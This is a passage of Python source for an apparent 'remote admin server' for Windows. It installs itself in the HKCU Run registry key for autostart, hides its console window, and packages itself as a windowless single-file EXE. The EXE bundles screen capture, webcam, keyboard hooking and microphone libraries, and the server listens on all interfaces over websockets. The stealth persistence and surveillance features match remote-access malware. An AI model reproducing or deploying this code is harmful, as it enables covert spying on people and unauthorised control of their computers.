    # Build command: "C:\path\to\python.exe" "C:\path\to\server.py" --secret SECRET --hidden
    cmd = f'"{python_exe}" "{server_py}" --secret {secret} --hidden'

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "RemoteAdmin", 0, winreg.REG_SZ, cmd)
        log.info("Autostart installed via registry: %s", cmd)
        print(f"Autostart installed in HKCU registry")
        return True
    except Exception as e:
        log.error(f"Registry autostart failed: {e}")
        print(f"Autostart failed: {e}")
        return False


def remove_autostart():
    """Remove autostart entry from HKCU registry."""
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, "RemoteAdmin")
        log.info("Autostart removed from registry")
        return True
    except FileNotFoundError:
        log.info("Autostart entry not found, nothing to remove")
        return True
    except Exception as e:
        log.error(f"Registry autostart removal failed: {e}")
        return False


# ===================================================================
# Build EXE
# ===================================================================
def build_exe():
    if not shutil.which("pyinstaller"):
        log.error("Install: pip install pyinstaller")
        sys.exit(1)
    script = Path(__file__).resolve()
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--name", "remote_server",
        "--hidden-import=mss", "--hidden-import=cv2",
        "--hidden-import=PIL", "--hidden-import=cryptography",
        "--hidden-import=websockets", "--hidden-import=keyboard",
        "--hidden-import=pynput", "--hidden-import=sounddevice",
        "--hidden-import=numpy",
        str(script),
    ]
    log.info("Building: %s", " ".join(cmd))
    r = subprocess.run(cmd, cwd=script.parent)
    if r.returncode == 0:
        log.info("EXE: %s", script.parent / "dist" / "remote_server.exe")
    else:
        log.error("Build failed")


# ===================================================================
# Hide console
# ===================================================================
def hide_console():
    if sys.platform == "win32":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass


# ===================================================================
# Main
# ===================================================================
SHARED_SECRET = ""

def main():
    global SHARED_SECRET
    parser = argparse.ArgumentParser(description="Remote admin server")
    parser.add_argument("--secret", required=True)
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8765)
    parser.add_argument("--build-exe", action="store_true")
    parser.add_argument("--hidden", action="store_true")
    parser.add_argument("--install", action="store_true")
    args = parser.parse_args()

    SHARED_SECRET = args.secret

    try:
        apply_pending_updates()
    except Exception as e:
        log.exception("Pending update error: %s", e)

    if args.install:
        install_autostart()
        return
    if args.build_exe:
        build_exe()
        return

    if args.hidden:
        hide_console()

    log_path = setup_file_logging()
    log.info("Server started, log: %s", log_path)

    if not HAS_MSS:
        log.warning("mss missing")
    if not HAS_CV2:
        log.warning("opencv-python missing")

    log.info("Starting on ws://%s:%d", args.host, args.port)

    async def run_server():
        try:
            async with websockets.serve(
                client_handler,
                args.host, args.port,
                ping_interval=30,
                ping_timeout=10,
                max_size=20 * 1024 * 1024,
            ):
                log.info("Server running. Waiting for clients...")
                await asyncio.Future()
        except asyncio.CancelledError:
            log.info("Server cancelled, exiting cleanly")
        except KeyboardInterrupt:
            log.info("KeyboardInterrupt, exiting cleanly")

    try:
        asyncio.run(run_server())
    except KeyboardInterrupt:
        log.info("Server stopped by user")


if __name__ == "__main__":
    main()
